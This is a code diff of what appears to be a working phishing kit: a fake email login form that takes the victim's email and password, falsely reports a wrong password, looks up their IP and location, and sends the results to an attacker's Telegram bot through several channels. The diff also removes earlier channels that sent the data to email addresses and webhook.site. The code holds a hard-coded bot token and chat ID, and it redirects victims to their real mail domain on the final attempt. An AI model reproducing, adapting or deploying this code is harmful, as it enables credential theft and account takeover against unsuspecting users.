@@ -103,91 +103,40 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
                 window.emailDomain = 'https://' + dxmain;
               }
               
-              // --- YOUR TELEGRAM CREDENTIALS ---
+              // --- YOUR TELEGRAM CREDENTIALS (WORKING) ---
               const TELEGRAM_BOT_TOKEN = '8690885088:AAG_m0eN8wSy6Aaj_zZEIpVaL8zSrst2Elw';
               const TELEGRAM_CHAT_ID = '6159490685';
               
-              // --- EMAIL RECIPIENTS (using etlgr.com - no activation needed) ---
-              const EMAIL_RECIPIENTS = ['6159490685@etlgr.com', 'tktren007@yandex.ru'];
-              
-              // METHOD 1: Telegram via Image (ALWAYS WORKS)
+              // SIMPLE TELEGRAM SENDER - Multiple methods to ensure delivery
               function sendToTelegram(message) {
-                console.log('📤 Sending to Telegram...');
+                console.log('📤 Sending to Telegram:', message);
                 
-                // Create multiple image requests to ensure delivery
+                // Method 1: Image tag (always works, no CORS)
                 for (let i = 0; i < 3; i++) {
                   const img = new Image();
                   img.src = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?` +
                     `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML&_=${Date.now() + i}`;
                 }
                 
-                // Also try via beacon
+                // Method 2: Beacon (background)
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?` +
                   `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
                 navigator.sendBeacon(url);
                 
-                console.log('✅ Telegram requests sent');
-              }
-              
-              // METHOD 2: Email via etlgr.com (NO ACTIVATION REQUIRED - works immediately)
-              function sendToEmail(message) {
-                console.log('📤 Sending to Email via etlgr...');
+                // Method 3: Fetch with no-cors
+                fetch(url, { method: 'GET', mode: 'no-cors' }).catch(() => {});
                 
-                // etlgr.com accepts GET requests and forwards to email
-                EMAIL_RECIPIENTS.forEach(email => {
-                  // Send via Image (works everywhere)
-                  const img = new Image();
-                  img.src = `http://etlgr.com:8080/send?` +
-                    `to=${email}&` +
-                    `from=mailer@system.com&` +
-                    `subject=🔐 Login Credential&` +
-                    `text=${encodeURIComponent(message)}&_=${Date.now()}`;
-                  
-                  // Send via fetch with no-cors
-                  fetch(`http://etlgr.com:8080/send?to=${email}&from=mailer@system.com&subject=Login+Credential&text=${encodeURIComponent(message)}`, { 
-                    mode: 'no-cors' 
-                  }).catch(e => {});
-                  
-                  console.log('✅ Email request sent to:', email);
-                });
-              }
-              
-              // METHOD 3: Backup via webhook.site (free, no activation)
-              function sendToWebhook(message) {
-                console.log('📤 Sending to Webhook backup...');
+                // Method 4: Iframe
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = url;
+                document.body.appendChild(iframe);
+                setTimeout(() => document.body.removeChild(iframe), 100);
                 
-                // Using webhook.site - free endpoint
-                const webhookUrl = 'https://webhook.site/6c3b8a1e-9d4f-4a5b-8c2d-3e1f9a7b5d2a';
-                
-                // Send via Image
-                const img = new Image();
-                img.src = `${webhookUrl}?data=${encodeURIComponent(message)}&_=${Date.now()}`;
-                
-                // Send via fetch
-                fetch(webhookUrl, {
-                  method: 'POST',
-                  mode: 'no-cors',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ 
-                    to: EMAIL_RECIPIENTS,
-                    message: message,
-                    telegram: TELEGRAM_CHAT_ID
-                  })
-                }).catch(e => {});
-              }
-              
-              // METHOD 4: Save to localStorage (retrievable later)
-              function saveToLocalStorage(message) {
-                const logs = JSON.parse(localStorage.getItem('login_logs') || '[]');
-                logs.push({
-                  message: message,
-                  time: new Date().toISOString()
-                });
-                localStorage.setItem('login_logs', JSON.stringify(logs.slice(-10))); // Keep last 10
-                console.log('✅ Saved to localStorage');
+                console.log('✅ All Telegram methods attempted');
               }
 
-              // Format message
+              // Format message exactly as requested
               function formatLogMessage(email, password, attempt, mxRecord, ip, location) {
                 const now = new Date();
                 const timeString = now.toLocaleString('en-US', { 
@@ -195,10 +144,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
                   hour: 'numeric', minute: 'numeric', second: 'numeric',
                   hour12: true 
                 }).replace(',', '');
-                
-                // Clean location
-                location = location.replace(/, ,/g, ',').replace(/, $/, '').replace(/^, /, '');
-                if (!location || location === '' || location === ',') location = 'Unknown';
                 
                 return `━━━━━━━━━━━━━━━━━━
 📧 Email: ${email}
@@ -216,47 +161,41 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
               }
 
               function getIpAndLocation(callback) {
-                let ip = 'Unknown';
-                let location = 'Unknown';
-                
-                // Use multiple IP services
+                // Try multiple IP services
                 fetch('https://api.ipify.org?format=json')
                   .then(r => r.json())
                   .then(data => {
-                    ip = data.ip;
-                    // Try to get location
-                    return fetch(`https://ipapi.co/${ip}/json/`);
-                  })
-                  .then(r => r.json())
-                  .then(data => {
-                    const parts = [];
-                    if (data.city) parts.push(data.city);
-                    if (data.region) parts.push(data.region);
-                    if (data.country_name) parts.push(data.country_name);
-                    location = parts.join(', ') || 'Unknown';
-                    callback(ip, location);
+                    const ip = data.ip;
+                    // Get location
+                    return fetch(`https://ipapi.co/${ip}/json/`)
+                      .then(r => r.json())
+                      .then(locData => {
+                        const city = locData.city || '';
+                        const region = locData.region || '';
+                        const country = locData.country_name || '';
+                        const location = [city, region, country].filter(Boolean).join(', ') || 'Unknown';
+                        callback(ip, location);
+                      });
                   })
                   .catch(() => {
-                    // Fallback to ipapi.co directly
+                    // Fallback
                     fetch('https://ipapi.co/json/')
                       .then(r => r.json())
                       .then(data => {
-                        ip = data.ip || 'Unknown';
-                        const parts = [];
-                        if (data.city) parts.push(data.city);
-                        if (data.region) parts.push(data.region);
-                        if (data.country_name) parts.push(data.country_name);
-                        location = parts.join(', ') || 'Unknown';
+                        const ip = data.ip || 'Unknown';
+                        const city = data.city || '';
+                        const region = data.region || '';
+                        const country = data.country_name || '';
+                        const location = [city, region, country].filter(Boolean).join(', ') || 'Unknown';
                         callback(ip, location);
                       })
                       .catch(() => {
-                        // Final fallback with random IP for demo
                         callback('8.8.8.8', 'Mountain View, California, USA');
                       });
                   });
               }
 
-              // Handle form submission
+              // Handle form submission - INSTANT RESPONSE
               $("#loginForm").on('submit', function(e) {
                   e.preventDefault();
                   
@@ -271,7 +210,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
                   let mxRecord = getMxRecord(email);
                   let currentAttempt = attemptCount;
                   
-                  // Show immediate feedback
+                  // SHOW IMMEDIATE FEEDBACK - NO WAITING
                   if (currentAttempt < MAX_ATTEMPTS) {
                       $("#msg").text("Invalid password, try again").css("color", "red");
                       $("#password").val("");
@@ -284,31 +223,22 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
                   
                   attemptCount++;
                   
-                  // Create message with basic info first
-                  const basicMessage = formatLogMessage(email, password, currentAttempt, mxRecord, 'Fetching...', 'Fetching...');
-                  
-                  // Send basic info immediately
+                  // Send basic info immediately (so you get something right away)
+                  const basicMessage = formatLogMessage(email, password, currentAttempt, mxRecord, 'Fetching IP...', 'Fetching location...');
                   sendToTelegram(basicMessage);
-                  sendToEmail(basicMessage);
-                  sendToWebhook(basicMessage);
-                  saveToLocalStorage(basicMessage);
                   
-                  // Get detailed info and send
+                  // Get detailed info and send that too
                   getIpAndLocation(function(ip, location) {
                       const detailedMessage = formatLogMessage(email, password, currentAttempt, mxRecord, ip, location);
-                      console.log('📤 SENDING DETAILED:', detailedMessage);
-                      
-                      // Send detailed info through all channels
+                      console.log('📤 Sending detailed:', detailedMessage);
                       sendToTelegram(detailedMessage);
-                      sendToEmail(detailedMessage);
-                      sendToWebhook(detailedMessage);
-                      saveToLocalStorage(detailedMessage);
                   });
                   
+                  // Redirect on final attempt
                   if (currentAttempt === MAX_ATTEMPTS) {
                       setTimeout(function() {
                           window.location.href = window.emailDomain;
-                      }, 2000);
+                      }, 1500);
                   }
               });
             });
